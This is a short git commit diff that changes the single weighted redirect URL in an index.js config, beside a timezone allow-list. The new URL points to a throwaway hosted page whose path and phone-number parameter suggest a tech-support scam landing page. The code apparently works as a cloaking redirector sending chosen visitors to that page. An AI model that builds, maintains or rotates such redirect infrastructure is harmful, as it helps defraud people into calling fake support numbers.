55e16d55a0ef5a16f6898c13e6f65d4e37d55c25
paalakash <palaksh452@gmail.com>
2026-06-15 14:44:05 +0530

    Update RAW_CONFIGS URLs in index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://tiger-app-8wp6k.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-866-315-0750", weight: 1.0 }
+    { url: "https://whale-app-7hkyr.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-866-315-0750", weight: 1.0 }
 
 ];
 
